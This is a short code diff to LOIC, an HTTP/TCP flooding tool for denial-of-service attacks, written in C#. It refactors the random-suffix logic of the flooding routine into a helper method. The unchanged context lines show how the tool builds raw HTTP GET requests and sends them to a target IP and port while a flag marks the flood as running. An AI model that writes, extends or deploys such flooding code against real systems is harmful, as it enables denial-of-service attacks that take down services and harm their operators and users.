@@ -66,15 +66,7 @@ namespace LOIC
 		{
 			try
 			{
-			    string randomString;
-				if (random)
-				{
-				    randomString = Functions.RandomString();
-				}
-				else
-				{
-				    randomString = string.Empty;
-				}
+			    string randomString = GetRandomString();
                 string bufferContents = String.Format("GET {0}{1} HTTP/1.1{2}Host: {3}{2}{2}{2}", Subsite, randomString, Environment.NewLine, Host);
                 byte[] buf = Encoding.ASCII.GetBytes(bufferContents);
 				var RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
@@ -105,7 +97,17 @@ namespace LOIC
 			catch { }
 			finally { IsFlooding = false; }
 		}
-		private static long Tick()
+
+	    private string GetRandomString()
+	    {
+	        if (random)
+	        {
+	            return Functions.RandomString();
+	        }
+	        return string.Empty;
+	    }
+
+	    private static long Tick()
 		{
 			return DateTime.Now.Ticks / 10000;
 		}
